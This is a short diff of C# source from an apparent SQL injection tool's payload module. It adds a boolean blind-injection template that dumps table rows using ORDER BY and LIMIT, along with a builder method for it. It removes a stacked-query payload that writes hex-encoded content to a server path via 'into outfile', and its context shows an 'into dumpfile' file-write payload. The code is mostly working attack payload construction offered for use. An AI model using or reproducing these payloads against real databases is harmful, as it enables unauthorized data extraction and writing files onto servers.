@@ -65,7 +65,8 @@ namespace SuperSQLInjection.payload
         //获取行数据bool
         public static String data_value = "(select {columns} from {dbname}.{table} limit {limit},1)";
 
-       
+        //获取数据bool,加入orderby解决获取数据时，获取到的数据每一行可能不对称的可能
+        public static String data_value_orderBy = "(select {columns} from {dbname}.{table} order by {orderby} limit {limit},1)";
 
         //union获取数据条数
         public static String data_count = "(select count(*) from {dbname}.{table})";
@@ -178,11 +179,6 @@ namespace SuperSQLInjection.payload
             sb.Remove(sb.Length - 1, 1);
             sb.Append(" into dumpfile '"+path+"'");
             return sb.ToString();
-        }
-
-        public static String creatMySQLWriteFileByUnionByMuSQL(String path, String content)
-        {
-            return ";select " + Tools.strToHex(content,"UTF-8") + " into outfile '" + path + "'";
         }
 
         public static String creatMySQLColumnsStrByError(List<String> columns, String table, String dbName, int limit)
@@ -361,6 +357,11 @@ namespace SuperSQLInjection.payload
 
         }
 
+        public static String getBoolDataPayLoad(String column, String orderBy, String dbName, String table, int index)
+        {
+            String data = data_value_orderBy.Replace("{columns}", column).Replace("{orderby}", orderBy).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{limit}", index + "");
+            return data;
+        }
 
 
 
